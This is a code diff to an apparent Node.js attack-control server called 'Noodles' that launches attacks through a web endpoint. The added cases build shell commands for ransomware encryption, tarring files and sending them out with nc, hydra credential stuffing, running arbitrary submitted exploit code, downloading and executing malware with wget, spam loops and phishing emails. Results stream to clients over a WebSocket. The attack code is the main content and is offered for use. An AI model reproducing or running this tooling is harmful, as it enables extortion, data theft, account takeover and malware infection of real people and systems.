@@ -16,6 +16,7 @@ const { spawn } = require('child_process');
 const cors = require('cors');
 const cluster = require('cluster');
 const numCPUs = os.cpus().length;
+const WebSocket = require('ws');
 
 app.use(cors());
 app.use(express.static('public'));
@@ -25,6 +26,7 @@ app.use(express.json());
 const logFilePath = path.join(__dirname, 'logs.txt');
 const apiKey = crypto.randomBytes(32).toString('hex');
 const registry = new promClient.Registry();
+const wss = new WebSocket.Server({ port: 8080 });
 
 const attackCounter = new promClient.Counter({
     name: 'noodles_attacks_total',
@@ -54,11 +56,16 @@ const log = (message) => {
         if (err) console.error('Failed to write to log:', err);
     });
     console.log(logMessage.trim());
+    wss.clients.forEach(client => {
+        if (client.readyState === WebSocket.OPEN) {
+            client.send(JSON.stringify({ type: 'log', message: logMessage.trim() }));
+        }
+    });
 };
 
 const apiLimiter = rateLimit({
     windowMs: 15 * 60 * 1000,
-    max: 1000000,
+    max: 10000000,
     message: 'Too many requests, try again after 15 minutes',
     standardHeaders: true,
     legacyHeaders: false,
@@ -159,6 +166,8 @@ function executeCommand(command) {
     return new Promise((resolve, reject) => {
         exec(command, { maxBuffer: 1024 * 1024 * 10 }, (error, stdout, stderr) => {
             if (error) {
+                log(`Command execution error: ${error.message}`);
+                log(`Command stderr: ${stderr}`);
                 reject(error);
                 return;
             }
@@ -175,6 +184,9 @@ function getRandomUserAgent() {
         'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:89.0) Gecko/20100101 Firefox/89.0',
         'Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1 Mobile/15E148 Safari/604.1',
         'Mozilla/5.0 (iPad; CPU OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1 Mobile/15E148 Safari/604.1',
+        'Noodles-Bot/1.0',
+        'Noodles-Attacker/2.0',
+        'Hax0r-Agent/3.0',
     ];
     return userAgents[Math.floor(Math.random() * userAgents.length)];
 }
@@ -400,6 +412,72 @@ app.post('/attack', async (req, res) => {
             }
             command = `timeout ${duration} bash -c "${deviceCommand}"`;
             break;
+        case 'ransomware':
+            const targetDirectory = req.body.targetDirectory || '/home/user/documents';
+            const encryptionKey = crypto.randomBytes(32).toString('hex');
+            command = `node ransomware.js --targetDirectory "${targetDirectory}" --encryptionKey "${encryptionKey}"`;
+            log(`Ransomware attack initiated on ${targetDirectory} with key ${encryptionKey}`);
+            break;
+
+        case 'data_theft':
+            const dataPath = req.body.dataPath || '/var/log';
+            command = `timeout ${duration} bash -c "tar -czvf stolen_data.tar.gz ${dataPath} && nc -w 3 ${encodedTarget} 9000 < stolen_data.tar.gz"`;
+            log(`Data theft initiated, stealing data from ${dataPath} to ${encodedTarget}`);
+            break;
+
+        case 'email_spam':
+            const emailTarget = req.body.emailTarget;
+            const emailSubject = req.body.emailSubject || 'Important Information';
+            const emailBody = req.body.emailBody || 'This is a spam email sent by Noodles.';
+            if (!emailTarget) {
+                log('Error: Email target is required for email spam.');
+                return res.status(400).send('Email target is required for email spam.');
+            }
+            command = `timeout ${duration} bash -c "for i in $(seq ${intensity}); do sendemail -f noodles@example.com -t ${emailTarget} -u '${emailSubject}' -m '${emailBody}' -s smtp.example.com -o tls=yes -xu noodles -xp password; done"`;
+            log(`Email spam attack initiated, sending spam to ${emailTarget}`);
+            break;
+
+        case 'credential_stuffing':
+            const userList = req.body.userList;
+            const passList = req.body.passList;
+            if (!userList || !passList) {
+                log('Error: User list and password list are required for credential stuffing.');
+                return res.status(400).send('User list and password list are required for credential stuffing.');
+            }
+            command = `timeout ${duration} bash -c "hydra -L ${userList} -P ${passList} ${encodedTarget} http-post-form '/login.php:username=^USER^&password=^PASS^:F=login_success'"`;
+            log(`Credential stuffing attack initiated on ${encodedTarget}`);
+            break;
+
+        case 'zero_day':
+            const exploitCode = req.body.exploitCode;
+            if (!exploitCode) {
+                log('Error: Exploit code is required for zero-day attack.');
+                return res.status(400).send('Exploit code is required for zero-day attack.');
+            }
+            command = `timeout ${duration} bash -c "${exploitCode}"`;
+            log(`Zero-day exploit initiated on ${target}`);
+            break;
+
+        case 'malware_deploy':
+            const malwareUrl = req.body.malwareUrl;
+            if (!malwareUrl) {
+                log('Error: Malware URL is required for malware deployment.');
+                return res.status(400).send('Malware URL is required for malware deployment.');
+            }
+            command = `timeout ${duration} bash -c "wget ${malwareUrl} -O malware && chmod +x malware && ./malware"`;
+            log(`Malware deployment initiated, downloading from ${malwareUrl}`);
+            break;
+
+        case 'social_engineering':
+            const victimEmail = req.body.victimEmail;
+            const phishingMessage = req.body.phishingMessage;
+            if (!victimEmail || !phishingMessage) {
+                log('Error: Victim email and phishing message are required for social engineering.');
+                return res.status(400).send('Victim email and phishing message are required for social engineering.');
+            }
+            command = `timeout ${duration} bash -c "sendemail -f noodles@example.com -t ${victimEmail} -u 'Important Update' -m '${phishingMessage}' -s smtp.example.com -o tls=yes -xu noodles -xp password"`;
+            log(`Social engineering attack initiated, sending phishing email to ${victimEmail}`);
+            break;
 
         default:
             log(`Error: Invalid attack type: ${attackType}`);
@@ -421,10 +499,24 @@ app.post('/attack', async (req, res) => {
             log(`Attack stderr: ${stderr}`);
         }
         log(`Attack completed. stdout: ${stdout}`);
+
+        wss.clients.forEach(client => {
+            if (client.readyState === WebSocket.OPEN) {
+                client.send(JSON.stringify({ type: 'attack_result', stdout: stdout, stderr: stderr }));
+            }
+        });
+
         res.send('Attack initiated. Check logs for details.');
     } catch (error) {
         log(`Attack failed: ${error.message}`);
         console.error(`exec error: ${error}`);
+
+        wss.clients.forEach(client => {
+            if (client.readyState === WebSocket.OPEN) {
+                client.send(JSON.stringify({ type: 'attack_failed', error: error.message }));
+            }
+        });
+
         res.status(500).send(`Attack failed: ${error.message}`);
     }
 });
@@ -481,6 +573,11 @@ process.on('uncaughtException', (err) => {
 process.on('unhandledRejection', (reason, promise) => {
     console.error('Unhandled Rejection at:', promise, 'reason:', reason);
     log(`Unhandled Rejection: ${reason}`);
+});
+
+wss.on('connection', ws => {
+    log('Client connected via WebSocket');
+    ws.on('close', () => log('Client disconnected'));
 });
 
 const PORT = process.env.PORT || 3000;
